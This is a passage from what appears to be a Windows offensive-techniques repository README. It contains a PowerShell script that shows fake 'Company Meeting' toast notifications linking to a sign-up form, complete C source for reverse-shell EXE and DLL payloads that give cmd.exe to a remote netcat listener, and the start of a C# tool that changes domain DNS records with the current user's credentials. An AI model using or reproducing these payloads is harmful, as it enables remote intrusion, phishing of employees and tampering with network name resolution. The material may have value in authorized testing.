+ 'v6IX2Ryas5NSxplKnSS7OM7M0VZPud3jNXKymRIMlaSeZE2i31FBpYIg81EmRcnyeA0UZy73Giq8cNh8'`
+ 'H3U2OFgLKZg4xhxQ83bvGdikVeuud7QZ1LfN2x+MAfbwntFJnNHLGqLP5spA455INjorDDam+USGLCDF'`
+ '0ZGw9JuBxu9K4Z/FxZXOju0fLFpkQcjEsnbqcpPAcScLYyHJLNY/7IfvSyA8Fy3vr6B0PENXdFCsCQ8M'`
+ 'slZop7Oe6QXS7ZP9o0QJuN6q+IGRXMGwXZRAtOLNoqPgcJN4jh0QZbTn3hyLR4qJjTTCMv4TD+MCItGn'`
+ 'frYXH39Gu6twt1RsMyBu+DznsBenJImCS+It4ZAlEIb7cofCOVXfRo8W27F6x9qZYx6jQuM5iAbOTTI2'`
+ 'hjQyUlIwsLM6kq4W6BjKMaC3bnlr2VJbGJloxnZZ6sASh031el0ka5D8+W9uN399bLSsZdE+wLdq1Bzg'`
+ '8wt5gmw87tFrip3nMiG5R3ulcY17LvngQ/0bvDqkzDQNZY5eVjMF2cKKRlBKQOuY2X9D/zhsBkFj6tz1'`
+ 'phVLuyiyA9iGpiy0mKz63/rNQAPEoVAoGO33W7XqtRUvuYLIQNPW6oCm2XRByqK5zDNUohg0yJqlotLI'`
+ 'iTaSOgs03AmTxAMn8EYB9zFCy6jqZvwNhIhvEvvvfh4+j15WMvcf0L2+PVUNWSna6iNN5R7d+S9pXdbP'`
+ 'PyMn2Dgeavr6r28cFYa8orhY2kHyyaKy9jcDHUM5BvSLy9asXJmFe3gx0JfhaGjgilzICZbT3jGskikI'`
+ 'bqrSJkjW6DhWrBMK3HaGHklSeaKacqrCwSt69jcBDTRS1VUdpYWq7uwosVy05SWOuzTxRYJbFUWv+osy'`
+ 'Uht069Q2iHJ43sHxdl6IvbCE6Sv6GWOe6Enh2nB3uQUzMh6ZxFNbWcEkiXlQWr799hhONokBB8u4fEwS'`
+ 'K62MoXepVQs02DmOfmrW82tX5wYiOh9p4cXLV014NBPjZYWbx9O6MCnH2PYcEPhb+ITdY9OR4NuYnztI'`
+ 'tY7ntxlYKoflkml/BuN30IKzgkyRpHySvMqoPM4fpJNnzCST5qGMkLsQyi4Z12V0IpTyudGrBaFtFvxW'`
+ 'kkv0q+MUNc3HJNKC2Uvj4WaZs8jIJlAGX2WeHxkqK7IZ2hbWshjaXrdug2+/HxFW3BSTytC5HnaMwJfG'`
+ 'oLvUrkQdMYPlaU/OXrsmPwY0J/yG8rQ6/60NHyKRUxNpOp1hdF4+e926gbxfx3KFPtLAimlXvh74VhBw'`
+ 'MeXxuAUlh1OzUShz6pN3DxhwA0KFZx+zma4A2p320op78/JAXI/zUqA9TLRgCQeLXnix++njoDhzn3r+'`
+ 'UcjzdeOJb36xVHjT69Su46PMAp6SmRatmfU05/o9yfAcdYwf/8QrawuuDPTvJs2auenMmWKRh7KzqO0N'`
+ 'UBkSp864WWW4wGfhqu/ijWMXU8XjAKUgZimay8OPZrW0Y5VQguaXTbnNqIMCtSAGNHyC9igt6NKoTiMs'`
+ 'mRb2gNKxkkrhJPvBwyMIIuHYz6nvfgALxO6Daalpt3z2leH0mZSEWkQokst6zZBvSNrMS7nl9NDqKpYr'`
+ 'AR0IBFQVD+sWF01cFwWavBjomKjCTbuq/Ua7FnEsRNdHx/3O8QPcOWYMvL56uohuE3W8AIIv+vsNnKWc'`
+ 'TCG9Rs1vXr+53849A7XwOB+bVl6ZyLJW2BLviI+MBSL8eW4KR8xPn7H5+CQVOWdN+weAZRjT/vEn/pGR'`
+ 'irufgDSguciKfd+3SfAVQlOTEtstnjcwGCn0MGPg8Xz2eSpU6grKbNqw4Z7PcLGOUJYq2n76HuoyAmt/'`
+ 'Cr9x4iXTZWXiSbI3aIgYgBdZtUBDMvT7qzqinI7sVzcUaJEMr8/C4Xn/VbdBcXYfB6VBms9rIClXJZlB'`
+ 'skkkaxP4bFnOqPCkcFwuVB844wF3wz0zdl4yVvjSK1lIqpfBGvAFZRrbHiDmeZco5nG8m6RMomz30RkC'`
+ 'mxsO2hQZ5y6WAwHjpAXQZ1bQWHLI4PO5wyEnCubwQZOPMkItTtKQVJy0Dxq+66ln+rdvWaei0rBwSf/k'`
+ 'pF5Z7jsRyhGFHIYfAVotJf229JS72UB6w9p1qGAWRacgbUYgYrytE9GsSePZSzr36d0S2hN+cjwc0/5z'`
+ 'Zdq0icO80kAvlQmqF0INLphkh4WCh1EoqMrSRW9oVQs0sHOMN8AsFueG9UUBKKN9Vki7Z4G2VlSM4jkL'`
+ 'z7oDgUy4VngicClQQCKUQvMZ3spcUTZzIlYXODwZM8dbPOVmWchjvaBMMi+NaxyMoPzObs/yRggWnDkZ'`
+ 'W4VHL4lZFeQoYDK4JQZPDoEtcSYUtBSXoduxn9IC2ohTvG1ISrdFCwdD6OH5DhQusmQt46QntRbR4IeT'`
+ 'JhWeBJoAwZhf2BEhM8/nnymHKy9o2rjF2x8mdWl5w/wl90eQnqPgjsY8MvCWlasHd2jTvl37Oh/tSQ6E'`
+ 'nXCRMaUETx1CW5GKoGrHv54A148nHY7wB3bjl441NRzRogmuyq5EHQB0LB+mpuo3bRoL8o4kbSBuYgBB'`
+ 'i1aVgkDIGULudz8YkpM7oPe9bbt1u6nn3c0Lsx87TUImMfF0ASdA28fVGgWKJTxYCTugDpS45Ogb9zHV'`
+ 'hYkiinJ0GUKGxtuTlEGS8ry4wk6F4JVEK+nLDiFnZmbHo9+N5PC0Fbg3G8sYy/kMgoj/5khSCJmbNmoP'`
+ '6QpwrKhwqv5Mrw/HNYDe47abbbYO0TH1rHnz769LXOe2w8NIkaXcSh4enrlF63q1iNrrXr4XoZIzv6QD'`
+ 'ZVuNfUePvhXipl5tolmz9gEojDkDQMzwVkG0ldPGXHu3Co+1vFzHMtEBXCxAE3n/cuRHWK5FlPMHEKsF'`
+ 'GiyaC/HvlYwelbxpU1kYgKZAclbJXuBBVrLOm9cX7qpRE2JUYsvVawa9+d6DL788tFun62Hl8ZPZkpzo'`
+ '9UDomSgKosb+5k5Dx/YNP/wwWdRsXsqIK0PGHIo4AyFXlChwAweHUPVRBlj44J37fZVWfwDKNicnjBG5'`
+ 'iT+dxkz6408OPBELRD1t1ZTM707iYSqErCNG3Z06ojXsmFDrxlc2dQd8PdGBiNmz7oINvjuTBI3zu0P5'`
+ 't7SK3/fDY00b1I4Srgke3uTJDwER52TdAzoE4U6roqQxPR5+pKUcAcQntb+1Vue7m0Cq4lhoZLiUDYZd'`
+ 'L74yEI55gkljIlYy9pYCjpJkUnsKKRCnEKlyjSIaMmEsnGmaSk6079hpVwMuaCPnZu7wguX7csNDvVvG'`
+ 'EfU2vg40lxdBbp4D3oBGl9evz606Y/swypCFbA+jZ8Pmt/bgK3vwke51618HoAuns30VpgjKLB3fZ/rM'`
+ 'TkAIrP/h+x/orDffLWmPIlS28W08bn3HHTcCHCKrV0n8pN/5eCSsPPRViqZYGO9oVjSHkSkvv+dtt930'`
+ 'zTEbfBXA9DVp9KgWacldABpA/9VVKbC+821wUmeFFw8IHDrshri+vkG9DMO9U5+5rWWdLlZL54VLHmoQ'`
+ 'X3fJ6t7PLOyWQLQe0A+QnSiLlkAgKz+766CBbeCRMDQEAeR5QMAsCNbjJx8OR4pI369agGYMrDAehfyR'`
+ 'cCioicAKVWheORkCyrBw4sTxtCTHjncdasAJ1VFVr2OUkvC7G8g05LGWPW6HVpnt8elZ3lzpgWA097m7'`
+ 'm8UI2SZVkHS8VMIH7G2bNvn6K92nB1LbtmgSQNmamKPiHiVHxw7100d2Q2isy9S+5fVNgQSO/YyHCOoR'`
+ '8bsO6OsRbQ59N0IUnBRtCKHMrm1bEkTc0R9TA/58zgc42leuHd68WYOO3Ykb6968av0wQFDkcr76xgmA'`
+ 'Ll754KBBtzaoT0ya3f/Obl13f4ID//0PcgMhu8KAnEi7r2erIf3veWvnIOAHLuAuyO3eqXn7Ozre8OZb'`
+ 'yWE0hVOTWUYn+hMZKbuCLKLVQRx/Lq+YIc2q/rzyCvw+YLRAjWFioISCiOYBgENBf42SIQAdW/jyywPp'`
+ 'qZmXAZqzeLzQMMfOnt8jjoiH+lGG1B/JkJHLYAWiJGhpjCiVnfGkhNH4Dz69t1EdONfkm+Jr7/k0mZXd'`
+ 'PpCcqGz08Nv69G3htHbyiqMJAlp9Vufb6q/fPGbF6geGDYY/za9uuq/ljaDDxnMo9Y4OjfbsTmtY78YN'`
+ 'b94TRLkIJW3YOrI+QRw+aSaI6/vdj0lDUDApQXJz2G6pk0A88lAHDRXu/OcAYIbWrYldn1g1lASlnaiM'`
+ 'VuS8aOo2BcJukS2BUjOEDGoYuMstBywko/f5zDxbJPshT6RLop1kILXaqiIXK0gr5AlwQXScRR+ANnk5'`
+ 'i185CGICv9x5nl0J6Fjkf7zr44w09/Z3Hf5AJssZqbMoQ4oTRQNSixau7AX5B+gP2ibF5T4yoDVBNDj0'`
+ 'EwTX2NO+EeUVrjCyLVsyctCApqOTerpzOodDbp4ejlDprEljJjzR6rHErk9N6Wk1d505F1cQ6Sld8kr6'`
+ 'PNi/1e5PdQEWuKWwWZta3W9pWrdWo2lTgWTTe/Vu1uOO5kCss54cAo/zs09NYWQuLrrjRDmoSQfpKzhB'`
+ 'DiKZZBQuUaS8INKzPkNIKKzw2lQ8XcYuCAWkaK0Ace1LPONN85FAbvkcaTjjfYSic3nJDvrVL+dKrPv0'`
+ '6QxB1p8i9aqYpbGZUL4zAu7uOHv7Jmi+NGuMfp6LaHM5ly5Iu0JIjoTU86vEaoEGlGNB/cYb26yWgvd3'`
+ 'OQU5A7+vwVQ9VfAzHnMwYHhxzWNtW9b+dL+xdXNo10TDG+CYZdD2GT6VF+wgsRFyzJ1zK3z1+CQgk7LT'`
+ 'vpEQoYtXDmrfohGEcLcuN6Q4ejaqD49qEvD7/OWDYcv772oHz4lRDKRolpSxSY+12vNxInzL+1PYivGw'`
+ 'AVi9OOLAIR1EMcfbwigThHb0qkAb2PF8Sc7E8XCdkLswKLwIX2F5g3urIQCxDMdfwUpcXuGOJFu0vVZt'`
+ 'A7tHd8TbVP2JRU4UzbOOZS7usTm3Bk5nI8khfmUjCiM//qnmX+3qQG/YsMFhK965yyUqOrj084A2k7gv'`
+ '3zHhie5dOzX/ZO9jZWWdFi5MBwhaN6m37R0ooooCAZOXSQxpU7ZvtsJ6hNs7/nGTmU/d3qoJcbI8K4Jy'`
+ 'TZaO8NW4sp6BSJpfcX9xNOXG+sSRY2ZKSOKE8T5WLwV1GrL7w+4KcgwUeJxkOO0t2/lhIseXQMVBg+SK'`
+ 'QgZ64ByBxu48VohXLV+I0SWON4uV7Bd61e41dKxQ6TGCtBCADkYumCt9JaBjyXDp0qVZmWXv73bJfgPE'`
+ 'xa9AsxaSAzbMcuV2uLUD5GiIR0huyQiNM5kwR3fr0Hz3Hp0fxL9sZKS062vVu7P77UZHt+vqt2l3G1RZ'`
+ '40UZkl7u2nVYjZyuhNovmWL0fu1xULKiYpfUzEpvGs1D2jELUo6Pdnq92RSVwwggCtNVv46iR/FM9P0B'`
+ '/GrUb+3X/o84PE4B/3BXPpBuIFIzjo6hDPb883Nzsybu3JUJQAsSlAm/UkcFmQoRnTv2rpvbNMCKjbSS'`
+ 'FVmSAlLEsv/L9JbNIFER/fp0/+yL/qKc9cU3yUnp7YcPafPmZkiDboaxibyNI92CZjvuNUl+g0yXUtJj'`
+ 'imqiPe5KTwrDGYPBXK83nSINNJPOi5kAMcUnV9IAcRJJ6yQ1z8PoQMPGUP6TAC2JptN0WhD/3EngPIqu'`
+ 'HmjQ0bGFWbNmuZ3j9x6wS4qe9hk57rx3OlhjIDhx7vxOACgt5rH4tyexe7xWXgWpX/bO1uH9encY0L9Z'`
+ 'MDJTkUGi4JyuhRz4163wZYHCx9wHkhzYMLpsjY4ExvgxOkh4lhnxxr/iCLvjju/zvzrv22vmQB0crROU'`
+ '9IjigUCtUWV4Tt49+eQT2c4Jn33hkGU9Q0KG+fXVCh+Z4qUNhw5bHh7Q+YfjSbwYTS9w87xF0tysqBcD'`
+ 'IzXkCqLsSma0JGQzeBI73vFy0febYIKNrz2slzoAzcPjF9MC6mFgjxrpaLCYwhs/fnwWjminqppYPO+r'`
+ 'Cmj4FOQsik9VkU1DmZycjPtI4XwQiXxahUd/psLFy24PmV7hTZP9zkpPBi9iYfAnaeb/CYe2znNWHzta'`
+ 'krfjeXjnvdBSLdAAcayvo7i4KEodblXDLwvxZyeXwCcrZpdTiZJU6PEaoyhXreeFHEa0UXyKl7KyjEWV'`
+ 'HF6fjhV0+B2LPw2f/iccgBZYh4cewSurQrjr89f/gFQt0AAxfIqimJ+fl+uecvgnA8+6GFoHYvOcDMJC'`
+ 'HbMqUOoFqFV1CGAChfUgS2ENjnT4hPUxP3/7/x3HE3T0XsrC+F04nmtCHTHVUVlZmZeXm5M59eufTALv'`
+ '4lg9nmR20dGv7v+jsF7qEEkCaCQbI9uCgeiPMp+1qwB95MiR7JzsPPfUb342i0Imzxo4ONZFR//bzzo0'`
+ 'WQ7/qonTJyRLuMfjV7sSR8Pnvn37srLdue6ph3+2SEKWyBm5/1F6/bc4AM0LepnL9PLDOPGjGJIxqxbo'`
+ 'mLzbuXNnfn5+prvs9AkXxWV4OANHXfXn2P5fu5cB4WEkfWZZmXj+j9FcBeg33nijoLAgO2v8qRMumteT'`
+ 'PBYefwN9BadYPFuVps2slH+eursadaxYsQIiOidn0ulTmQxvoATz30BfyXENYaRJs8A5Krkx4YgYAxPs'`
+ 'KkAvWLCgoCA/N3fqmZNZrGCixP93QMPNnpOkoALgE3e0AgJRwRrtcY2hAZ94mRJ0ZKVZlpwnmQEh9Ov/'`
+ 'BLwK0NOmTSsuGZubmX8avy6YIfIANx7VPv9S/vecYkwkZYw5Lq+qeq6tPjKD560S1MMUlGNGSrBQAiw4'`
+ '8E8q4CkSUPe6aDYT/xoS72C4VEXZFgMTrFqgYzZx4sSSsWMLcsaWMzaGy+C4TKju/reBhpjlRTsn2sAF'`
+ '0YHhjs464wU7y7t5PpvjHV5KzzFG7Phn3pNZKIBpM8caeU7PMgYOlhkLT6cJoZercLxqROfm5paWjhtb'`
+ 'MN4ruPBvmON/F2HATeaS6/tz+O/hNFwWRIuDaOGKF0gaz48AJylc4uLfumBM4Jyo48R0WkgVFB3NZlB0'`
+ 'OnYqw8enkUIGKaQzksHDD6vkhnu4MR4umeVNMTDBrgK0zWYrKxs/rngSKWfB0yMpO8X9B39fP0qIVTdc'`
+ 'hRrmwbPLsW0wJ1bV9xiFs+N1eLkKrHMHia5hgFWj41X4T7xj7OAsOP6HDmZBtAgSEIJVVm1awB6Mjs9G'`
+ 'J03Agh3h9z6tgpjkI4f++OOAI0cG/vBdYsVxl6ROE9VnRXmpKKyS/VsU/9uy/xNF3h/UfgoFToX9lRE/'`
+ 'JavHYmCCXQloURStVuu4svFlReM8jEPiDZLguPAnLf89HouXGKbRmd5GXOgzeH4eAETiMTOzhzREp9Ia'`
+ 'WRHPfIxmJAsr2DnOTlFmktSxgpmlzDRpkgQb48vgeLMo2QTB6NeskWB2OJgdCWeikDuIDAg5QyhTVlxq'`
+ 'xKmGXacrDd/9kPz5weS3PxiyePndk6d1KCi5Na+4a27ufdmZ/XPHjpo43bl0xbyNW1/7+vDpkydE6YLS'`
+ 'OmqxHtEL+0UvsitxdGVlpd1uLyubMKFkHCk4RV4nwF2djaB/o1e96sNaoj8EhSfV4b5/QSfyTolz8rCe'`
+ 'zpB4lyhksoyd8lp53obfPWGdkpCnKrnBcCGeYYRyovP/Yu8eZ4khh0cwnyEtR44lvf3RyFe3DHn6ubtK'`
+ 'xrdLTen4YP8md91Rr2UzIma1iPieXe8ePTzZactbNG/t29v2fbHv6IlfPAEVnS+EYxbGBjVG1RSBmMEq'`
+ '/A8now5WtfZCuxLQ33zzDQA9fvzECWXFrGqVxQyWtv4bgcbkCI5n5uFpEtgFPJUUz75lTD7KQHNpgmzy'`
+ 'awDc2ACyqsikRqwQhoxi9gmWn86kHzg8/N1dw9a89vDUJ3vm5HTOSOv3YN/u3W9v3+z6hlUonmf1G7Rr'`
+ 'f/MD9/V5KDkpY8b0Z3Z9/JmPYqtu9WKLhPFYlBxAAkKBYFBRVCYUYUNBLQZxEP+DpYuArrLfA/TevXsB'`
+ '6AkTHp80vpAPmiUxnSGtFH0BdQDrAfR4lB5PfMdMij+j4Ykdv3WCiTK6HiIXVkZZEnf/Wzg8/9UsKlZN'`
+ 'swXD+Gc6osFoAU5ECP7MOuXRf/F10uYtQxYtHDC2+CG7te/wId363tu2S+cObdu0b1CnBUFAWAKm9Qki'`
+ 'vgrOqNWqXXvoiMdsLseiFxe/88Hbx378vsJbGbrkF+li//osgsKKquD/VBUKBCFawxG/rATUYEANhNSI'`
+ 'FpBCYTkSCYTgWzwREdtFaOIwPmuAddXaC+1KQL/55ptFRUV5ecVPTy8kGXtQdTOc0XdeROMXVGm3wBWI'`
+ 'kpWXrCxvw2kHEBf0WLdzZi+D/08TC8zA6GXFpAYN/rAJYjOIbLxsonjbydO2gweT3/kwfcXqx6bNHOJy'`
+ '9un/j76dutzTsEHHhLjb6tfrWK9O6+bNOjdv3ummxm2at7i5adPWDRs1jo+vDWjeeGPjW2/reP8D9ycl'`
+ 'Jj75xJOvvLL2yy+/5Hm+6uqvZFF4L2OXWXneqssjWEO7EtAbNmwoLi4uKCh59qkiWrCqsh0yIf7HQVVA'`
+ 'W894RpzxjvCxaRSfStM6FsQjY+cZJ5CAqFqCUcYMoXTI3Xwo8+vvhr++I+3F5RllY0fYjUMyUkYMHzyg'`
+ '95139+l5f6+7H+jevVePOx7o2qlft6539ujRo1u3bp07d2rXrn2rVq3r1q1Xv36D5s2ade3aJSMj4/HH'`
+ 'H9+4cePBgwdJkqy60Ess1oqr/vhz2JWAXrRoUUlJSVFR2by5RbwC2dxA0kYKl0kx/WSS/cW8lO9jdZxi'`
+ '8aMMBaUxir6SMh4+Zvxgl37ZEv3k0gyrIX3wwCF3dRpwX/fE+3s/2m/AwIceefgfDz344MCH+z04qHef'`
+ 'h+7q+WDPXvd373FX63Zt2nZo1a5t+86dug0ePMhgTJ8y9fEtWzYfO/a9olww6+ecQVNVVRXacuxPADc6'`
+ '+hbUNO2vBPTs2bPHjh1bXDxhwfxiUTPwbHr09+rsoEBFyFEBsxrKCCIrxeR//K5l/vP2aVOdOU69MTFj'`
+ 'zIiMESPSHxueBv7IoyOHjhgxYvSooSOHDBs2bNDDQ/r3Hdind/877+zWoWO7Tp1vHfCPfsOGDCvOLV61'`
+ 'YtWu93dXVpSr6kU/eQGECBkd0yIgG8MRwFUUBZYB0MBZi4KMDcfzXwjomTNnQkQD0AvnZYshK8Pky0pa'`
+ 'MJgoKYavjmSt22idONVhtbtGPmZLS8k06B0Go81ssev0htS01HSwjPQxY8Y8OnjQww8/PGDAgD739end'`
+ 'u/dDDw10OOwzZ87YuHETqBpZvnyo/lb7s8F6qVULNMTF5MmTS8eOLSiasG5VAUKJtN/wwW7HnOlPl+U8'`
+ 'bjVku52lrszMrGxHXkG+O8thNhtNRpPBYACEU1JSHn30UQB31OhRUFtOmjQJ8urRb49CBVR19PMMYvPP'`
+ 'D9Mft2qBhlgDyTFu3LiiovEvv5y7fn2uM2NOTlbpuLKxJWXZJaVFhSVFhYXjcnML7A6jzpCi1+uSkpLT'`
+ '0tJKS0uXLVu2a9cuQQAReiWLiSEwWKha9b9r1QINOik7O3v8+PFlZePyCp4YO2Fcfk7ZxHHuCSWzSorH'`
+ 'FeTmOSwGXboeAnnqE2XrXtm0f//B8vLyqp2jBgiez5iAJnBrjEljG0CAx96wg29ja/6HrVqgfT4ftHrg'`
+ '6DJAelxp2bgyl8uZnZtXWFQwYcKEpcuWvffee16ft2rrv+1qVi3Q+/fvz8/Pj8q7IqvV6nK5gBB2794N'`
+ '6jX2Oi1YLFphIUYCsZV/22WtWqAhYGMRvWTJkqNHj1atPTtoC8gCCcTwjRHC/wee/SNWLdBr1qwBrAHB'`
+ '2J8AKPApGAANK88hC0ENK/8O56tatUD/bf9e+xvo/4oh9H9lRypbYKHUjQAAAABJRU5ErkJggg==')
$msgbytes = [Convert]::FromBase64String('PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9'`
+ 'InV0Zi04Ij4KICAgIDx0aXRsZT5Db21wYW55IE1lZXRpbmc8L3RpdGxlPgogIDwvaGVhZD4KICA8Ym9k'`
+ 'eT4KVGhlIGNvbXBhbnkgbWVldGluZyB3aWxsIGJlIGhlbGQgaW4gMyBkYXlzLiAgUGxlYXNlIHNpZ24g'`
+ 'dXAgb24gdGhlIGNhbGVuZGFyIHRvZGF5LjxiciAvPjxiciAvPgo8Zm9ybSBhY3Rpb249Imh0dHBzOi8v'`
+ 'MTI3LjAuMC4xL3JlZ2lzdGVyLnBocCIgbWV0aG9kPSJnZXQiIHRhcmdldD0iX2JsYW5rIj4KPGJ1dHRv'`
+ 'biB0eXBlPSJzdWJtaXQiPlNpZ24gVXA8L2J1dHRvbj4KPC9mb3JtPgogIDwvYm9keT4KPC9odG1sPgoK')
[IO.File]::WriteAllBytes($imgfile, $imgbytes)
[IO.File]::WriteAllBytes($msgfile, $msgbytes)
# Create the XML from a template
$toastXml = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastImageAndText02)
$toastXml = [xml] $toastXml.GetXml()
$imageElements = $toastXml.GetElementsByTagName("image");
$imageElements[0].Attributes.GetNamedItem("src").Value = "file:///" + $imgfile
$stringElements = $toastXml.GetElementsByTagName("text")
$stringElements[0].AppendChild($toastXml.CreateTextNode($title)) > $null
$stringElements[1].AppendChild($toastXml.CreateTextNode($message)) > $null
# Insert action button
$xe = $toastXml.GetElementsByTagName("toast")
$nn1 = $toastXml.CreateNode("element", "actions", "")
$nc1 = $xe.AppendChild($nn1)
$nn2 = $toastXml.CreateNode("element", "action", "")
$nc2 = $nc1.AppendChild($nn2)
$na1 = $toastXml.CreateAttribute("content")
$null = $na1.Value = "Instructions"
$null = $nc2.SetAttributeNode($na1)
$na2 = $toastXml.CreateAttribute("activationType")
$null = $na2.Value = "protocol"
$null = $nc2.SetAttributeNode($na2)
$na3 = $toastXml.CreateAttribute("arguments")
$null = $na3.Value = "file:///" + $msgfile
$null = $nc2.SetAttributeNode($na3)
# Send the notification
$x = New-Object Windows.Data.Xml.Dom.XmlDocument
$x.LoadXml($toastXml.OuterXml)
$notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($appid)
# Nag 3 times
for($i = 0; $i -lt 3; $i++)
{
   $toast = New-Object Windows.UI.Notifications.ToastNotification($x)
   $notifier.Show($toast)
   Start-Sleep 60
}
```

**The alert will look like this**

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/pop0.png)

## >> Reverse shell binaries using Win32 C

Example EXE `rvshexe.exe` and DLL `rvshdll.dll` payloads that provide cmd.exe reverse shells.

**Compiling an EXE**

```c
// x86_64-w64-mingw32-gcc -m64 -static rvshexe.c -o rvshexe.exe -lws2_32

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

WSADATA wsaData;
SOCKET sock;
struct sockaddr_in sai;
STARTUPINFO si;
PROCESS_INFORMATION pi;
char *ip;
char *port;

int main(int argc, char* argv[])
{
    if(argc != 3)
    {
        printf("You must provide the IP address and port of the netcat listener.\n");
        return -1;
    }
    ip = argv[1];
    port = argv[2];
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if(sock == INVALID_SOCKET)
    {
        printf("Error in WSASocket, %d.\n", WSAGetLastError());
        return -1;
    }
    sai.sin_family = AF_INET;
    sai.sin_port = htons(atoi(port));
    sai.sin_addr.s_addr = inet_addr(ip);
    if(WSAConnect(sock, (SOCKADDR*)&sai, sizeof(sai), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
    {
        printf("Error in WSAConnect, %d.\n", WSAGetLastError());
        return -1;
    }
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES);
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    if(!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        printf("Error in CreateProcess, %d.\n", GetLastError());
        return -1;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    return 0;
}
```

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/rvsh01.png)

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/rvsh02.png)

**Compiling a DLL**

```c
// x86_64-w64-mingw32-gcc -m64 -shared -Wl,--kill-at rvshdll.c -o rvshdll.dll -lws2_32

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>

void CALLBACK Remote(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);

void CALLBACK Remote(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in sai;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char ip[200];
    char port[200];
    char *tok;

    tok = strtok(lpszCmdLine, " ");
    if(strlen(tok) == 0 || strlen(tok) > 15)
    {
        return;
    }
    strcpy(ip, tok);
    tok = strtok(NULL, " ");
    if(strlen(tok) == 0 || strlen(tok) > 5)
    {
        return;
    }
    strcpy(port, tok);
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if(sock == INVALID_SOCKET)
    {
        return;
    }
    sai.sin_family = AF_INET;
    sai.sin_port = htons(atoi(port));
    sai.sin_addr.s_addr = inet_addr(ip);
    if(WSAConnect(sock, (SOCKADDR*)&sai, sizeof(sai), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
    {
        return;
    }
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES);
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    if(!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        return;
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
}
```

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/rvsh03.png)

![alt text](https://github.com/billchaison/Windows-Trix/blob/master/rvsh04.png)

## >> Add/Remove DNS records using dnsapi.dll in C#

Example source `dnsrec.cs` for adding and deleting domain DNS records as the currently logged on user.

**Compiling an EXE**

```csharp
using System;
using System.Runtime.InteropServices;
using System.Net;

namespace DNSUtil
{
   class AddDelRecord
   {
      [DllImport("dnsapi.dll", EntryPoint = "DnsModifyRecordsInSet_A", CharSet = CharSet.Ansi, SetLastError = false, ExactSpelling = true)]
      static extern bool DnsModifyRecordsInSet(IntPtr pAddRecords, IntPtr pDeleteRecords, int Options, IntPtr hContext, IntPtr pExtra, IntPtr pReserved);

      [StructLayout(LayoutKind.Sequential)]
      public struct DNS_RECORD_FLAGS
      {
         internal uint data;
         public uint Section
         {
            get { return data & 0x3u; }
            set { data = (data & ~0x3u) | (value & 0x3u); }
         }
         public uint Delete
         {
            get { return (data >> 2) & 0x1u; }
            set { data = (data & ~(0x1u << 2)) | (value & 0x1u) << 2; }
         }
         public uint CharSet
         {
            get { return (data >> 3) & 0x3u; }
            set { data = (data & ~(0x3u << 3)) | (value & 0x3u) << 3; }
         }
         public uint Unused
         {
            get { return (data >> 5) & 0x7u; }
            set { data = (data & ~(0x7u << 5)) | (value & 0x7u) << 5; }
         }
         public uint Reserved
         {
            get { return (data >> 8) & 0xFFFFFFu; }
            set { data = (data & ~(0xFFFFFFu << 8)) | (value & 0xFFFFFFu) << 8; }
         }
      }

      [StructLayout(LayoutKind.Explicit)]
      public struct FlagsUnion
      {
         [FieldOffset(0)]
         public uint DW;
         [FieldOffset(0)]
         public DNS_RECORD_FLAGS S;
      }

      [StructLayout(LayoutKind.Sequential)]
      public struct DNS_A_DATA
      {
         public uint IpAddress;
         public System.Net.IPAddress IPAddressObject { get { return new IPAddress((long)IpAddress); } }
      }

      [StructLayout(LayoutKind.Sequential)]
      public struct DNS_PTR_DATA
      {
         public IntPtr pNameHost;
      }

      [StructLayout(LayoutKind.Explicit)]
      public struct DataUnion
      {
         [FieldOffset(0)]
         public DNS_A_DATA A;
         [FieldOffset(0)]
         public DNS_PTR_DATA CNAME;
      }

      [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
      public struct DNS_RECORD
      {
          public IntPtr pNext;
          public string pName;
          public ushort wType;
          public ushort wDataLength;
          public FlagsUnion dwFlags;
          public uint dwTtl;
          public uint dwReserved;
          public DataUnion Data;
      }

      private static void Usage()
      {
         Console.WriteLine("Adds or deletes a DNS record in the domain using current Windows credentials.");
         Console.WriteLine("<add|del> <A|CNAME> <domain> <record> <data> <TTL>\n");
         Console.WriteLine("Usage (add A record):        dnsrec.exe add A site.com www 10.1.2.3 3600");
         Console.WriteLine("Usage (add CNAME record):    dnsrec.exe add CNAME site.com www web.anothersite.com\n");
         Console.WriteLine("Usage (delete A record):     dnsrec.exe del A site.com www 10.1.2.3 3600");
         Console.WriteLine("Usage (delete CNAME record): dnsrec.exe del CNAME site.com www web.anothersite.com");
      }
      private static void AddRec(string RType, string RDomain, string RHost, string RTarget, string RTTL)
      {
         string domain;
         DNS_RECORD rec;
         uint ipv4;
         IntPtr pRec;
         bool r;
